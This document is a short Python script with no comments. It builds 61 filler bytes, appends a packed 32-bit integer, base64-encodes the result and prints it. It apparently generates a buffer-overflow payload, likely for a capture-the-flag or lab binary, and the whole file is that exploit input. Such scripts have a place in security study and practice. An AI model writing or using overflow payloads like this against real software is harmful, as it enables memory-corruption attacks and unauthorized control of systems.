
import sys
import struct
import base64

buf = b'mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm'
buf += struct.pack('<I', 1916487828)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
